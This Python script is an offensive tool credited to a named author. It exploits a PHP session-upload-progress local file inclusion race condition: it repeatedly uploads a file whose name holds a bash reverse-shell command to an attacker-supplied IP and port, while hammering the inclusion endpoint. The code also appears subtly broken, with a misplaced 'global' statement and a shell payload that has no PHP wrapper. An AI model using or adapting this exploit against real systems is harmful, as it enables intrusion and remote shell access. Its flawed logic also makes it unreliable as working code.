#!/usr/bin/env python3
# made by Taylor Christian Newsome

import argparse
import threading
import time
import requests

STOP_FLAG = False

def uploader(upload_url, session_id, cmd):
    """Continuously uploads files with the session upload progress parameter to maintain the session file."""
    global STOP_FLAG
    files = {'file': (cmd, 'A' * 10000)}
    data = {'PHP_SESSION_UPLOAD_PROGRESS': session_id}
    cookies = {'PHPSESSID': session_id}
    
    while not STOP_FLAG:
        try:
            requests.post(upload_url, files=files, data=data, cookies=cookies, timeout=2)
        except requests.exceptions.RequestException:
            pass

def includer(lfi_url, session_id):
    """Continuously requests the LFI endpoint to include the session file before cleanup."""
    global STOP_FLAG
    # Common PHP session paths (adjust if targeting /tmp/ or /var/lib/php/sessions/)
    session_paths = [
        f"/var/lib/php/sessions/sess_{session_id}",
        f"/tmp/sess_{session_id}"
    ]
    
    while not STOP_FLAG:
        for path in session_paths:
            try:
                target = f"{lfi_url}{path}"
                resp = requests.get(target, timeout=2)
                if resp.status_code == 200 and ("nohup" in resp.text or "bash" in resp.text):
                    print(f"\n[+] Successfully included session file via: {path}")
                    STOP_FLAG = True
                    return
            except requests.exceptions.RequestException:
                pass

def main():
    parser = argparse.ArgumentParser(
        description="Session Upload Progress LFI Race Condition Exploit\nmade by Taylor Christian Newsome",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("-u", "--upload-url", required=True, help="Target URL handling the file upload")
    parser.add_argument("-l", "--lfi-url", required=True, help="Target LFI URL base (e.g., http://target/index.php?page=)")
    parser.add_argument("-i", "--ip", required=True, help="Attacker IP address for the reverse shell")
    parser.add_argument("-p", "--port", default="4444", help="Attacker port for the reverse shell (default: 4444)")
    parser.add_argument("-s", "--session", default="testkey", help="Session ID value (default: testkey)")

    args = parser.parse_args()

    print("========================================")
    print(" Session Upload Progress LFI Exploit    ")
    print(" made by Taylor Christian Newsome       ")
    print("========================================")

    # Build the bash reverse shell command
    cmd = f"nohup bash -c 'bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1' >/dev/null 2>&1 &"

    print(f"[*] Target Upload URL: {args.upload_url}")
    print(f"[*] Target LFI Base:   {args.lfi_url}")
    print(f"[*] Reverse Shell IP:  {args.ip}:{args.port}")
    print("[*] Starting concurrent threads...")

    # Spawn threads for uploading and including simultaneously
    t_upload = threading.Thread(target=uploader, args=(args.upload_url, args.session, cmd))
    t_include = threading.Thread(target=includer, args=(args.lfi_url, args.session))

    t_upload.daemon = True
    t_include.daemon = True

    t_upload.start()
    t_include.start()

    try:
        while not STOP_FLAG:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] Stopping exploit execution...")
        global STOP_FLAG
        STOP_FLAG = True

if __name__ == "__main__":
    main()
